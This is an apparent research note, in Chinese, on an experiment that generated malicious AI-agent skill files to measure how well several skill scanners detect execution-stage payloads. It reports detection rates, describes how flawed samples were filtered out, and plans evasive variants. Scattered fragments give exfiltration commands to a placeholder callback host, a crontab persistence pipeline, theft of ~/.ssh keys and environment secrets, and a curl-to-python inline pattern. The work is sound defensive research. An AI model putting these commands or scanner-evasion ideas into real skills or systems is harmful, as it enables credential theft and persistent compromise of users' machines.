> 版本：2026-08-19（v2，净化后）| 样本：18（6 形态 × 3 坐标）| 后端：ecnu-max
> 数据：`scanners/eval_results/verdict_arm10.csv`、`arm10_sp_raw/`、`arm10_raw/`
> 生成：`generator/arm10_generate.py`（恶意写实校验版）

## 一、动机：推边界，不取巧

用户方向：**找 taxonomy 坐标上真实存在、scanner 扫不出、且不依赖扫描器实现缺陷（隐藏文件/manifest 欺骗）的新攻击**。

Arm7-9（隐藏文件/manifest 注入）被用户判定为"取巧"——利用的是 scanner 的实现细节。本实验聚焦**执行阶段载荷**：恶意在 SKILL.md 可见文本 + 运行时数据流，静态可读、无隐藏文件、无声明欺骗。

**净化的必要性（方法学教训）**：初版生成暴露两类缺陷——① LLM 生成良性版（8/18 无恶意写实）；② LLM 引用脚本但 [SCRIPTS] 标签未输出（9/18 脚本缺失）。两者都制造"假漏"。净化 = 恶意写实校验 + 纯指令完整性筛选 + 补脚本重扫。

## 二、实验设计：6 形态 × 3 坐标

| 形态 | 机制 | wild 证据 |
|---|---|---|
| M1 remote-pull | 远端指令拉取（恶意在远端脚本） | bonero-miner、zkclaw |
| M2 var-inject | 变量注入管道（用户输入插值执行） | insider-wallets-finder `${TOKEN}` |
| M3 env-read | 环境变量读取（agent 读密钥外传） | klaviyoapi 类 |
| M4 delayed-trigger | 延迟触发（cron/systemd 定时恶意） | 挖矿家族常驻 |
| M5 runtime-url | 运行时 URL 拼接（静态无完整 URL） | agent-browser 裸 IP |
| M6 user-driven | 用户输入驱动（特定参数触发后门） | 逻辑后门类 |

坐标：C1 user_input×code_exec×info_theft / C2 external_content×code_exec×persistent_control / C3 source_agnostic×instruction_manip×defense_evasion

## 三、净化流程（关键方法学贡献）

1. **恶意写实校验**（v1 生成器增强）：SKILL.md 必须含外传/持久化/凭证指令（`curl -X POST {CALLBACK}/sync`、`crontab -l | ... | crontab -`、`读取 ~/.ssh 密钥`），否则重试。18/18 通过 + 人工逐样本确认。
2. **纯指令完整性审计**：9/18 引用本地脚本但脚本缺失（parse_output 的 [SCRIPTS] 解析未捕获 LLM 输出格式）→ 含脚本样本不可信。
3. **补脚本重扫**：arm10-02 补 wallet_analyzer.py 后 SS 0→100（脚本让 SS 从代码取证）。

**可信子集 = 9 个纯指令完整样本**（SKILL.md 完整描述恶意、无脚本引用、无缺失）。

## 五、关键发现

### 1. ⚠️ 初版结论被推翻：SS 对写实的执行阶段载荷无盲区

初版"SS 28%、全漏 56%"是**生成缺陷假象**（弱恶意 + 脚本缺失）。净化后：
- **纯指令完整子集 SS 9/9 (100%)**——写实的外传指令被 SS 语义分析（SDI/SQP/E1/PE3）全部抓到
- 有脚本样本补脚本后 SS 0→100——**SS 从脚本代码取证，有脚本必检出**

**修正 Arm3 结论**：SS 盲区不是"载荷时序"（执行阶段暴露），而是"恶意完全不在静态可见范围"（Arm7 隐藏文件是真盲区）或"生成缺陷制造的不可执行假象"。写实的执行阶段载荷对 SS 无效。

### 2. 真发现：Cisco 对纯指令执行阶段载荷弱（22%）

Cisco 2/9 检出——纯指令形态无字面命令（无 curl|bash 字面、无 YARA 触发面），Cisco 的 DFA/YARA 看不到运行时数据流。**这是无脚本缺失干扰的真发现**（9 个纯指令样本均完整）。
- 检出 2 个：arm10-01（M1 含 `curl -fsSL {CALLBACK}/sync.sh` 字面）、arm10-04（M4 含 `crontab -l | ... | crontab -` 字面）
- 漏检 7 个：M2/M5/M6/M1（无字面命令形态）

### 3. Cat 56% 偏盲（无字面命令）

Cat 5/9——纯指令样本无 curl|bash/base64/pip 字面时 Cat 正则失明（与 Arm1 的"Cat 无字面命令全盲"一致）。漏检 4 个：arm10-01/11/12/13。

### 4. M2 变量注入的"全漏"不可复现

初版 arm10-02/08 全漏——但两者都**脚本缺失**（arm10-02 缺 wallet_analyzer.py，arm10-08 缺 update_proxy.py）。arm10-02 补脚本后 SS 100。**纯指令 M2（arm10-14）SS 检出**。**M2 变量注入不是稳定的三家盲区**——"无脚本纯指令 + 变量注入"在 18 样本里没有可信的全漏实例。

### 5. 与 wild 的张力

wild insider-wallets-finder 是**真全漏**（仅 Cisco 捕获）——但构造复现失败。原因推测：wild 样本的恶意在"管道处理 python 代码"里（`curl ... | python3 -c "import sys,json; ..."` 内联代码），构造样本的 LLM 倾向把恶意写得更明显（SKILL.md 描述外传）或引用脚本。**wild 的不可复现性本身是发现**：构造实验的"写实"要求与 wild 的"隐晦"之间存在张力——写实 = SS 检出，隐晦 = 生成缺陷。

## 六、对论文 S5 的价值

1. **负面结果的价值**：SS 对写实执行阶段载荷 100% 检出——证明 SS 语义分析对"可见恶意"的鲁棒性，**修正 Arm3/KEY_INSIGHTS 的"载荷时序盲区"表述**。
2. **Cisco 盲区实锤**：纯指令执行阶段载荷 Cisco 22%（无字面命令无触发面）——Cisco 的 DFA/YARA 对运行时数据流盲。
3. **方法学贡献**：执行阶段载荷实验的"假漏"陷阱——LLM 生成偏差（良性版/脚本缺失）必须靠净化流程（写实校验 + 完整性审计 + 补脚本重扫）排除，否则污染结论。这是对主实验 L1/L2/L3 分类的补充。
4. **构造 vs wild 的保真度张力**：构造实验"写实"要求与 wild"隐晦"风格冲突——复现 wild 盲区需要"隐晦但不缺陷"的构造，这是生成器的下一挑战。

## 七、局限

- 可信子集仅 9 样本，n 小统计力有限
- Cisco/Cat 弱检出的"漏检"里可能混入弱恶意（无外传信号但已写实）——需进一步人工确认
- 补脚本改变了样本（arm10-02），非纯构造产物
- ECNU 生成稳定性差（初版 8/18 良性 + 9/18 脚本缺失），生成器需修 parse_output 的 scripts 提取

## 八、下一步建议

1. **修 parse_output 脚本提取**（LLM 可能输出不同格式，需兼容 JSON/多文件），重生成含脚本样本
2. **Cisco 纯指令盲区扩样**：10 个纯指令变体（M2/M5/M6 无字面形态）验证 Cisco 22% 稳定性——这是当前唯一可信的推边界方向
3. **wild 隐晦构造**：研究 insider-wallets-finder 的"隐晦但不缺陷"构造方法（管道内联代码 vs 显式外传），尝试复现 wild 全漏
4. **Arm11 候选**：纯指令 + 内联管道代码（`curl | python3 -c "..."` 内联恶意）——wild 真全漏形态
